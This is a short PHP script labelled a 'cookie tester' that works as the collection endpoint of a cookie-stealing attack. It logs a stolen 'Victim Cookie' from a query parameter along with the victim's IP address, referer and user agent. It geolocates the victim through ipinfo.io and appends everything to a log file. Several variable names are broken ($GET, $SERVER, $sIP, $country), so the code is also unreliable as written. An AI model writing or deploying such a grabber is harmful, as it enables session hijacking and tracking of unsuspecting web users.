<?php
###########################
#
#
# cookie tester (Mostafa_Abdellah)
#
#
###########################
$cookie = "[+]Victim Cookie => [" . $GET['cookie'] . "]";
$ip = "[+]Victim Ip => [" . $SERVER['REMOTE_ADDR'] . "]";
$ref = "[+]Victim Comes From => [" . $SERVER['HTTP_REFERER'] . "]";
$uAgent = "[+]Victim Details => [" . $SERVER['HTTP_USER_AGENT'] . "]";
$sNAME = "[+]Server Name => [" . $SERVER['SERVER_NAME'] . "]";
$sIp = "[+]Server Ip => [" . $SERVER['SERVER_ADDR'] . "]";
function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])){
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }
    return $ipaddress;
}
$publicIP = get_client_ip();
$json     = file_get_contents("http://ipinfo.io/$publicIP/geo");
$json     = json_decode($json, true);
$counttry = "User Country IS =>" . $json['country'];
$region = "User Region IS =>" . $json['region'];
$city = "User City IS =>" . $json['city'];
$all ="\n-------(Begin)-------\n" .$cookie ."\n\n" . $ip ."\n\n" . $ref ."\n\n" . $uAgent ."\n\n" . $sNAME . "\n\n" . $sIP . "\n\n" ."--------(LOCATION)--------"."\n\n". $country . "\n" . $region . "\n" . $city . "\n\n" . "-------(END)-------";
$handle = fopen('Log.txt' , 'a');
fwrite($handle ,$all);
fclose($handle);
